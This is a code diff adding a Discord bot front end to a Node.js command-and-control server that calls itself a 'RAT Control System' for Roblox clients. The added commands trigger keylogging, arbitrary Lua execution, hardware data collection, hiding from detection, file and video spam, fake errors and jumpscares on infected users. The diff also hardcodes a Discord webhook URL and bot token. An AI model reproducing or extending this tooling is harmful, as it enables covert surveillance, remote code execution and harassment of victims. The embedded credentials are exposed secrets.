@@ -1,11 +1,492 @@
 const http = require('http');
 const fetch = require('node-fetch');
+const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
+
+// Инициализация Discord бота
+const discordClient = new Client({ 
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers
+    ] 
+});
 
 let commandQueue = [];
 let lastScreenshot = null;
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
+const SERVER_URL = "https://ratserver-6wo3.onrender.com";
 
 global.onlineUsers = new Map();
+
+// ========== DISCORD BOT FUNCTIONS ==========
+
+// Функция отправки команды на RAT сервер
+async function sendCommand(command, args = [], target = null) {
+    try {
+        const response = await fetch(`${SERVER_URL}/command`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ command, args, target })
+        });
+        console.log(`📨 Команда ${command} отправлена`);
+        return response.ok;
+    } catch (error) {
+        console.error(`❌ Ошибка отправки команды ${command}:`, error);
+        return false;
+    }
+}
+
+// Получение списка онлайн пользователей
+async function getOnlineUsers() {
+    try {
+        const response = await fetch(`${SERVER_URL}/users`);
+        if (response.ok) {
+            return await response.json();
+        }
+        return { users: [], count: 0 };
+    } catch (error) {
+        console.error('❌ Ошибка получения пользователей:', error);
+        return { users: [], count: 0 };
+    }
+}
+
+// Обработчик событий Discord бота
+discordClient.on('ready', () => {
+    console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
+    console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
+    
+    discordClient.user.setActivity('RAT Control Panel v2.8', { type: 'WATCHING' });
+});
+
+// Обработка сообщений (старые команды через префикс /)
+discordClient.on('messageCreate', async message => {
+    if (message.author.bot) return;
+    
+    if (message.content.startsWith('/')) {
+        const args = message.content.slice(1).split(' ');
+        const command = args.shift().toLowerCase();
+        
+        switch(command) {
+            case 'test':
+                if (await sendCommand("popup", ["Тест от Discord бота! ✅"])) {
+                    message.reply('✅ Тестовая команда отправлена!');
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'print':
+                if (await sendCommand("print")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('📡 Проверка связи')
+                        .setDescription('Команда проверки связи отправлена')
+                        .setColor(0x00ff00);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'users':
+                const data = await getOnlineUsers();
+                
+                if (data.count === 0) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('👥 Онлайн пользователи')
+                        .setDescription('❌ Нет активных пользователей')
+                        .setColor(0xff0000);
+                    message.reply({ embeds: [embed] });
+                    return;
+                }
+                
+                const embed = new EmbedBuilder()
+                    .setTitle('👥 Онлайн пользователи')
+                    .setDescription(`**Всего пользователей:** ${data.count}`)
+                    .setColor(0x00ff00)
+                    .setTimestamp();
+                
+                // Группируем по играм
+                const games = {};
+                data.users.forEach(user => {
+                    const game = user.place || 'Unknown';
+                    if (!games[game]) games[game] = [];
+                    games[game].push(user);
+                });
+                
+                for (const [game, users] of Object.entries(games)) {
+                    const userList = users.slice(0, 5).map(u => 
+                        `\`${u.player}\` (${u.executor || 'Unknown'})`
+                    ).join('\n');
+                    
+                    embed.addFields({
+                        name: `🎮 ${game} (${users.length})`,
+                        value: userList + (users.length > 5 ? `\n... и еще ${users.length - 5}` : ''),
+                        inline: false
+                    });
+                }
+                
+                message.reply({ embeds: [embed] });
+                break;
+                
+            case 'status':
+                try {
+                    const response = await fetch(`${SERVER_URL}/status`);
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        const embed = new EmbedBuilder()
+                            .setTitle('📊 Статус системы')
+                            .setDescription('Текущее состояние RAT Control System')
+                            .setColor(0x7289da)
+                            .addFields(
+                                { name: '🤖 Бот', value: '🟢 Активен', inline: true },
+                                { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
+                                { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
+                                { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
+                                { name: '🛠️ Техническая информация', value: `• Версия: \`2.8.0\`\n• Сервер: \`${SERVER_URL}\`\n• Обновление: \`15 секунд\``, inline: false }
+                            )
+                            .setTimestamp();
+                        
+                        message.reply({ embeds: [embed] });
+                    }
+                } catch (error) {
+                    message.reply('❌ Ошибка получения статуса');
+                }
+                break;
+                
+            case 'kick':
+                const reason = args.join(' ') || 'Нарушение правил';
+                if (await sendCommand("kick", [reason])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🦶 Игроки кикнуты')
+                        .setDescription(`**Причина:** ${reason}`)
+                        .setColor(0xe74c3c);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'freeze':
+                let seconds = parseInt(args[0]) || 5;
+                seconds = Math.min(seconds, 60);
+                
+                if (await sendCommand("freeze", [seconds])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('❄️ Заморозка активирована')
+                        .setDescription(`Игроки заморожены на \`${seconds}\` секунд`)
+                        .setColor(0x3498db);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'void':
+                if (await sendCommand("void")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🌀 Телепорт в бездну')
+                        .setDescription('Игроки телепортированы в бездну')
+                        .setColor(0x2c3e50);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'spin':
+                if (await sendCommand("spin")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🔄 Вращение активировано')
+                        .setDescription('Игроки начинают вращаться')
+                        .setColor(0xf39c12);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'fling':
+                if (await sendCommand("fling")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🚀 Подбрасывание')
+                        .setDescription('Игроки подброшены в воздух')
+                        .setColor(0xe67e22);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'sit':
+                if (await sendCommand("sit")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🪑 Изменение позы')
+                        .setDescription('Игроки меняют позу (сидят/встают)')
+                        .setColor(0x27ae60);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'dance':
+                if (await sendCommand("dance")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('💃 Танец активирован')
+                        .setDescription('Игроки начинают танцевать')
+                        .setColor(0xe91e63);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'mute':
+                if (await sendCommand("mute")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🔇 Звуки отключены')
+                        .setDescription('Все звуки в игре выключены')
+                        .setColor(0x95a5a6);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'unmute':
+                if (await sendCommand("unmute")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🔊 Звуки включены')
+                        .setDescription('Все звуки в игре включены')
+                        .setColor(0x2ecc71);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'blur':
+                let blurSeconds = parseInt(args[0]) || 5;
+                blurSeconds = Math.min(blurSeconds, 30);
+                
+                if (await sendCommand("blur", [blurSeconds])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🔵 Размытие экрана')
+                        .setDescription(`Экран размыт на \`${blurSeconds}\` секунд`)
+                        .setColor(0x3498db);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'jumpscare':
+                let scareType = parseInt(args[0]) || 1;
+                const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
+                const name = scareNames[scareType] || scareNames[1];
+                
+                if (await sendCommand("jumpscare", [scareType])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle(`👻 Скример ${name} запущен!`)
+                        .setDescription('**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n\n⚠️ Приготовься к ужасу!')
+                        .setColor(0xff0000)
+                        .addFields(
+                            { name: '🎭 Тип', value: name, inline: true },
+                            { name: '🕒 Длительность', value: '~10 секунд', inline: true }
+                        )
+                        .setFooter({ text: 'Полноэкранный режим активирован' });
+                    
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'message':
+                const text = args.join(' ');
+                if (!text) {
+                    message.reply('❌ Укажите текст сообщения');
+                    return;
+                }
+                
+                if (text.length > 100) {
+                    message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
+                    return;
+                }
+                
+                if (await sendCommand("popup", [text])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('📩 Сообщение отправлено')
+                        .setDescription(`\`\`\`${text}\`\`\``)
+                        .setColor(0x3498db);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки сообщения');
+                }
+                break;
+                
+            case 'execute':
+                const code = args.join(' ');
+                if (!code) {
+                    message.reply('❌ Укажите код для выполнения');
+                    return;
+                }
+                
+                if (code.length > 500) {
+                    message.reply('❌ Код слишком длинный (макс. 500 символов)');
+                    return;
+                }
+                
+                if (await sendCommand("execute", [code])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🔧 Код отправлен')
+                        .setDescription(`\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``)
+                        .setColor(0xf39c12);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'fakeerror':
+                const errorText = args.join(' ') || 'Системная ошибка';
+                const displayText = errorText.length > 80 ? errorText.substring(0, 77) + '...' : errorText;
+                
+                if (await sendCommand("fakeerror", [displayText])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('⚠ Фейковая ошибка')
+                        .setDescription(`Сообщение: \`${displayText}\``)
+                        .setColor(0xe74c3c);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'keylog':
+                if (await sendCommand("keylog")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('⌨️ Кейлоггер активирован')
+                        .setDescription('Кейлоггер собирает данные. Логи будут отправляться каждые 5 минут.')
+                        .setColor(0xe74c3c);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'stopkeylog':
+                if (await sendCommand("stopkeylog")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('🛑 Кейлоггер деактивирован')
+                        .setDescription('Сбор данных остановлен. Последние логи отправлены.')
+                        .setColor(0x2ecc71);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'hardware':
+                if (await sendCommand("hardware")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('✅ Запрос отправлен')
+                        .setDescription('Данные об оборудовании запрошены')
+                        .setColor(0x00ff00);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'hide':
+                if (await sendCommand("hide")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('✅ Скрипт скрыт')
+                        .setDescription('Скрипт успешно скрыт от систем обнаружения')
+                        .setColor(0x00ff00);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'memory':
+                let fileCount = parseInt(args[0]) || 100;
+                fileCount = Math.min(fileCount, 1000);
+                
+                if (await sendCommand("memory_spam", [fileCount])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('✅ Memory Spam запущен')
+                        .setDescription(`Создание ${fileCount} файлов начато`)
+                        .setColor(0xff6b6b);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'gallery':
+                let imageCount = parseInt(args[0]) || 10;
+                imageCount = Math.min(imageCount, 50);
+                
+                if (await sendCommand("gallery_spam", [imageCount])) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('✅ Gallery Spam запущен')
+                        .setDescription(`Скачивание ${imageCount} видео начато\n**Источник:** GitHub`)
+                        .setColor(0x74b9ff)
+                        .addFields(
+                            { name: '📁 Файлы', value: 'Сохраняются в Download/Workspace', inline: false },
+                            { name: '🎥 Контент', value: 'Видео с GitHub', inline: true }
+                        );
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'chat':
+                if (await sendCommand("chat")) {
+                    const embed = new EmbedBuilder()
+                        .setTitle('💬 Управление чатом')
+                        .setDescription('Команда переключения чата отправлена')
+                        .setColor(0x9b59b6);
+                    message.reply({ embeds: [embed] });
+                } else {
+                    message.reply('❌ Ошибка отправки команды');
+                }
+                break;
+                
+            case 'help':
+                const helpEmbed = new EmbedBuilder()
+                    .setTitle('🤖 RAT Control Panel v2.8')
+                    .setDescription('Полный список доступных команд для управления клиентами')
+                    .setColor(0x7289da)
+                    .addFields(
+                        { name: '🧪 Основные команды', value: '`/test` - Тестовая команда\n`/print` - Проверка связи', inline: false },
+                        { name: '💬 Чат команды', value: '`/chat` - Активировать/деактивировать чат\n`/message <текст>` - Отправить всплывающее сообщение', inline: false },
+                        { name: '👤 Управление игроком', value: '`/kick <причина>` - Кикнуть игроков\n`/freeze <секунды>` - Заморозить игроков\n`/void` - Телепорт в бездну\n`/spin` - Крутить игроков\n`/fling` - Подбросить игроков\n`/sit` - Сидеть/встать\n`/dance` - Танцевать', inline: false },
+                        { name: '🔊 Аудио/Видео', value: '`/mute` - Выключить звуки\n`/unmute` - Включить звуки\n`/blur <секунды>` - Размытие экрана', inline: false },
+                        { name: '👻 Скримеры', value: '`/jumpscare <тип>` - Запустить скример (1-Джефф, 2-Соник)', inline: false },
+                        { name: '👥 Пользователи', value: '`/users` - Показать онлайн пользователей\n`/status` - Статус системы', inline: false },
+                        { name: '⚙️ Системные команды', value: '`/execute <код>` - Выполнить Lua-код\n`/fakeerror <текст>` - Показать фейковую ошибку\n`/keylog` - Активировать кейлоггер\n`/stopkeylog` - Остановить кейлоггер', inline: false },
+                        { name: '🖥️ Оборудование', value: '`/hardware` - Данные об оборудовании\n`/hide` - Скрыть скрипт', inline: false },
+                        { name: '💥 Spam команды', value: '`/memory <кол-во>` - Спам файлами в памяти\n`/gallery <кол-во>` - Спам видео с GitHub', inline: false }
+                    )
+                    .setFooter({ text: `Сервер: ${SERVER_URL} | Всего команд: 25` });
+                
+                message.reply({ embeds: [helpEmbed] });
+                break;
+                
+            default:
+                message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
+        }
+    }
+});
+
+// ========== SERVER FUNCTIONS ==========
 
 function cleanupInactiveUsers() {
     const now = Date.now();
@@ -99,7 +580,7 @@ const server = http.createServer((req, res) => {
                     target: target || null
                 });
                 
-                // Логируем только важные события
+                // Логируем важные события
                 if (command === "inject_notify") {
                     await sendDiscordMessage(
                         "🔌 Новый инжект!",
@@ -207,14 +688,66 @@ const server = http.createServer((req, res) => {
         return;
     }
     
+    // Информация о системе (новый эндпоинт)
+    if (req.method === 'GET' && req.url === '/system_info') {
+        res.end(JSON.stringify({
+            name: "RAT Control System",
+            version: "2.8.0",
+            description: "Продвинутая система удаленного управления Roblox клиентами",
+            server: SERVER_URL,
+            endpoints: [
+                { path: "/data", method: "GET", description: "Получение команд для клиента" },
+                { path: "/command", method: "POST", description: "Отправка команд от бота" },
+                { path: "/users", method: "GET", description: "Список онлайн пользователей" },
+                { path: "/status", method: "GET", description: "Статус сервера" },
+                { path: "/screenshot", method: "GET", description: "Получение скриншота" }
+            ],
+            features: [
+                "Управление игроком (кик, заморозка, телепорт)",
+                "Скример система (Джефф Килер, Соник.exe)",
+                "Чат система с сообщениями",
+                "Мониторинг устройств",
+                "Кейлоггер",
+                "Spam инструменты"
+            ],
+            discord_bot: discordClient.user ? {
+                username: discordClient.user.tag,
+                status: "online",
+                commands_count: 25
+            } : { status: "starting" }
+        }));
+        return;
+    }
+    
     res.writeHead(404);
     res.end(JSON.stringify({ error: "Not Found" }));
 });
 
-server.listen(process.env.PORT || 3000, () => {
-    console.log("🚀 Сервер запущен на порту 3000");
+// Запуск Discord бота
+discordClient.login('MTM5Nzk4NTQyODM4NDI1NjAwMA.GHeP85.k2qv2aPdZQTLCnZAMh1JgWtxrpLTnBAZ8sdSRA').then(() => {
+    console.log('✅ Discord бот успешно авторизован');
+}).catch(error => {
+    console.error('❌ Ошибка авторизации Discord бота:', error);
+});
+
+// Запуск HTTP сервера
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log("🚀 Сервер запущен на порту", PORT);
+    console.log("🤖 Discord бот интегрирован в сервер");
     console.log("📡 Эндпоинты:");
     console.log("• GET  /data?player=NAME - Получение команд");
     console.log("• POST /command - Отправка команд");
     console.log("• GET  /users - Список онлайн пользователей");
+    console.log("• GET  /status - Статус сервера");
+    console.log("• GET  /system_info - Информация о системе");
+    console.log("• GET/POST /screenshot - Скриншоты");
+    console.log("• POST /keylog - Кейлоггер");
+    console.log("");
+    console.log("💬 Discord команды:");
+    console.log("• /help - Список всех команд");
+    console.log("• /test - Тестовая команда");
+    console.log("• /users - Онлайн пользователи");
+    console.log("• /jumpscare [тип] - Скримеры");
+    console.log("• Всего 25 команд - смотри /help");
 });
